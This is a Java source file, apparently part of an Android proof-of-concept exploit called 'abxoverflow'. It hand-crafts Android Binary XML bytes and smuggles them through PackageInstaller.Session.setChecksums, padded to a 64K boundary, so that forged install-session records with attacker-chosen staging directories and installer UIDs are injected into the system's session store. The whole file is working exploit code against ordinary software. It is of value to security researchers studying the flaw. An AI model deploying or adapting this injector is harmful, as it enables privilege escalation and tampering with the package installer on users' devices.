package com.example.abxoverflow;

import static org.xmlpull.v1.XmlPullParser.END_DOCUMENT;
import static org.xmlpull.v1.XmlPullParser.END_TAG;
import static org.xmlpull.v1.XmlPullParser.START_TAG;

import android.annotation.SuppressLint;
import android.content.ContextWrapper;
import android.content.pm.Checksum;
import android.content.pm.PackageInstaller;
import android.os.Process;

import org.xmlpull.v1.XmlSerializer;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.List;

class AbxInjector {

    // frameworks/libs/modules-utils/java/com/android/modules/utils/BinaryXmlSerializer.java
    static final int ATTRIBUTE = 15;

    static final int TYPE_NULL = 1 << 4;
    static final int TYPE_STRING = 2 << 4;
    static final int TYPE_STRING_INTERNED = 3 << 4;
    static final int TYPE_BYTES_HEX = 4 << 4;
    static final int TYPE_BYTES_BASE64 = 5 << 4;
    static final int TYPE_INT = 6 << 4;
    static final int TYPE_INT_HEX = 7 << 4;
    static final int TYPE_LONG = 8 << 4;
    static final int TYPE_LONG_HEX = 9 << 4;
    static final int TYPE_FLOAT = 10 << 4;
    static final int TYPE_DOUBLE = 11 << 4;
    static final int TYPE_BOOLEAN_TRUE = 12 << 4;
    static final int TYPE_BOOLEAN_FALSE = 13 << 4;

    ByteArrayOutputStream mOut = new ByteArrayOutputStream();

    // Current time for calculation of session expiry time
    long mTimeMillis = System.currentTimeMillis();

    void writeShort(int v) {
        mOut.write((byte) ((v >> 8) & 0xff));
        mOut.write((byte) (v & 0xff));
    }

    public void writeInt(int v) {
        mOut.write((byte) ((v >> 24) & 0xff));
        mOut.write((byte) ((v >> 16) & 0xff));
        mOut.write((byte) ((v >> 8) & 0xff));
        mOut.write((byte) ((v >> 0) & 0xff));
    }

    void writeLong(long v) {
        int i = (int) (v >> 32);
        mOut.write((byte) ((i >> 24) & 0xff));
        mOut.write((byte) ((i >> 16) & 0xff));
        mOut.write((byte) ((i >> 8) & 0xff));
        mOut.write((byte) ((i >> 0) & 0xff));
        i = (int) v;
        mOut.write((byte) ((i >> 24) & 0xff));
        mOut.write((byte) ((i >> 16) & 0xff));
        mOut.write((byte) ((i >> 8) & 0xff));
        mOut.write((byte) ((i >> 0) & 0xff));
    }

    void writeInternedUTF(String s) {
        writeShort(0xFFFF);
        writeUTF(s);
    }

    void writeUTF(String s) {
        byte[] bytes = s.getBytes(StandardCharsets.UTF_8);
        if (bytes.length > 0xFFFF) {
            throw new RuntimeException("Modified UTF-8 length too large: " + bytes.length);
        }

        writeShort(bytes.length);
        mOut.write(bytes, 0, bytes.length);
    }

    void startTag(String name) {
        mOut.write(START_TAG | TYPE_STRING_INTERNED);
        writeInternedUTF(name);
    }

    void attributeInt(String name, int value) {
        mOut.write(ATTRIBUTE | TYPE_INT);
        writeInternedUTF(name);
        writeInt(value);
    }

    void attributeLong(String name, long value) {
        mOut.write(ATTRIBUTE | TYPE_LONG);
        writeInternedUTF(name);
        writeLong(value);
    }

    void attributeString(String name, String value) {
        mOut.write(ATTRIBUTE | TYPE_STRING);
        writeInternedUTF(name);
        writeUTF(value);
    }

    void attributeBoolean(String name, boolean value) {
        if (value) {
            mOut.write(ATTRIBUTE | TYPE_BOOLEAN_TRUE);
        } else {
            mOut.write(ATTRIBUTE | TYPE_BOOLEAN_FALSE);
        }
        writeInternedUTF(name);
    }

    void endTag(String name) {
        mOut.write(END_TAG | TYPE_STRING_INTERNED);
        writeInternedUTF(name);
    }

    public void endDocument() {
        mOut.write(END_DOCUMENT | TYPE_NULL);
    }

    @SuppressLint("WrongConstant")
    void injectInto(PackageInstaller.Session session) throws IOException {
        byte[] rawBytes = mOut.toByteArray();
        int toPad = 0x10000 - (rawBytes.length % 0x10000);
        byte[] paddedBytes = new byte[rawBytes.length + toPad];
        System.arraycopy(rawBytes, 0, paddedBytes, 0, rawBytes.length);
        session.setChecksums("a", List.of(new Checksum(0, paddedBytes)), null);
    }

    void injectSession(int sessionId, String ownerPackageName, boolean prepared, String stageDir) {
        startTag("session");
        attributeInt("sessionId", sessionId);
        attributeInt("userId", Process.myUid() / 100000);
        attributeString("installerPackageName", ownerPackageName);
        attributeInt("installerUid", Process.myUid());
        attributeLong("createdMillis", mTimeMillis);
        attributeLong("updatedMillis", mTimeMillis);
        attributeString("sessionStageDir", stageDir);
        attributeBoolean("prepared", prepared);
        attributeBoolean("committed", false);
        attributeBoolean("sealed", false);
        attributeInt("mode", PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        attributeInt("installFlags", 0);
        attributeInt("installLocation", 0);
        attributeLong("sizeBytes", 0);
        attributeInt("installRason", 0); // sic
        attributeInt("packageSource", 0);
        attributeBoolean("isReady", false);
        endTag("session");
    }
}
